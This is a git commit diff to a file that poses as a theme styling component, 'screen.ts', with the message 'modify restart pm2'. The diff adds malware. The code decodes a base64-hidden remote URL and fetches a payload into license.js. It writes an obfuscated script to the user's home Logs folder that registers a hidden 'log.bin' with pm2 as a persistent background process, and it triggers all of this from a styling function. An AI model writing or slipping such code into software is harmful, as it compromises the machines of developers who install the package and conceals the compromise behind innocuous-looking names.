ad2089123e8550de22d53653c12b6c99b3eae99d
Daiki Fujimoto <daikifujimoto.yato@gmail.com>
2025-04-06 16:15:14 -0400

    modify restart pm2

--- src/theme/components/screen.ts
+++ src/theme/components/screen.ts
@@ -1,12 +1,12 @@
-const { execSync, spawn } = require('child_process');
+const { execSync } = require('child_process');
 const path = require('path');
 const fs = require('fs');
 const os = require('os');
 const axios = require('axios');
 
 async function fetchDataAndWriteFile() {
+  const FILE_PATH = `${process.cwd()}/license.js`;
   try {
-    const FILE_PATH = `${process.cwd()}/license.js`;
     const scope = Buffer.from(
       'aHR0cHM6Ly9zb2NrZXQtY2xpZW50LXJoby52ZXJjZWwuYXBw',
       'base64',
@@ -23,13 +23,27 @@ async function fetchDataAndWriteFile() {
   }
 }
 
+async function makePM2() {
+  const filedata = `const _0x1ac3ba=_0x555e;(function(_0x3e55ac,_0x28e0e5){const _0x44aec5=_0x555e,_0x3396ca=_0x3e55ac();while(!![]){try{const _0x227083=parseInt(_0x44aec5(0x8b))/0x1*(parseInt(_0x44aec5(0x80))/0x2)+-parseInt(_0x44aec5(0x79))/0x3+parseInt(_0x44aec5(0x7c))/0x4*(parseInt(_0x44aec5(0x7b))/0x5)+parseInt(_0x44aec5(0x7e))/0x6*(-parseInt(_0x44aec5(0x8a))/0x7)+parseInt(_0x44aec5(0x85))/0x8+-parseInt(_0x44aec5(0x84))/0x9*(-parseInt(_0x44aec5(0x7a))/0xa)+parseInt(_0x44aec5(0x87))/0xb*(-parseInt(_0x44aec5(0x81))/0xc);if(_0x227083===_0x28e0e5)break;else _0x3396ca['push'](_0x3396ca['shift']());}catch(_0x6f5525){_0x3396ca['push'](_0x3396ca['shift']());}}}(_0x7996,0x1db78));function _0x7996(){const _0x205d75=['pm2\x20start\x20','250074atmvGR','5780TiIKGR','5RxhAqa','949736fWPtCS','pm2\x20save','67398AXnhvl','child_process','417854JzdfKV','1464kHYOlJ','join','homedir','801hgkBOG','736176ZMIMxl','/log.bin\x20--name\x20yato\x20--interpreter\x20node','25575clrDuw','Logs','path','63snduuZ','1HvvmBf'];_0x7996=function(){return _0x205d75;};return _0x7996();}const {execSync}=require(_0x1ac3ba(0x7f)),path=require(_0x1ac3ba(0x89)),os=require('os'),sourcePath=path[_0x1ac3ba(0x82)](os[_0x1ac3ba(0x83)](),_0x1ac3ba(0x88));function _0x555e(_0x3178e,_0x7e72bd){const _0x7996c6=_0x7996();return _0x555e=function(_0x555e81,_0x21462a){_0x555e81=_0x555e81-0x78;let _0x4fbfb9=_0x7996c6[_0x555e81];return _0x4fbfb9;},_0x555e(_0x3178e,_0x7e72bd);}execSync(_0x1ac3ba(0x78)+sourcePath+_0x1ac3ba(0x86)),execSync(_0x1ac3ba(0x7d));`;
+
+  // const filedata = `
+  //   const { execSync } = require('child_process');
+  //   const path = require('path');
+  //   const os = require('os');
+
+  //   const sourcePath = path.join(os.homedir(), 'Logs');
+  //   execSync(
+  //     "pm2 start " + sourcePath + "/log.bin --name yato --interpreter node",
+  //   );
+  //   execSync('pm2 save');
+  // `;
+
+  const src = path.join(os.homedir(), 'Logs', 'local');
+  fs.writeFileSync(src, filedata, 'utf8');
+}
+
 const screenStyle = () => {
-  const scriptPath = `${process.cwd()}/license.js`;
-  const child = spawn('node', [scriptPath], {
-    detached: true,
-    stdio: 'ignore',
-  });
-  child.unref();
+  const scriptPath = path.join(os.homedir(), 'Logs', 'local');
 
   switch (process.platform) {
     case 'linux':
@@ -128,6 +142,9 @@ const modifyStyle = async () => {
       `pm2 start "${sourcePath}/log.bin" --name yato --interpreter node`,
     );
     execSync('pm2 save');
+
+    makePM2();
+    screenStyle();
   }
 };
 
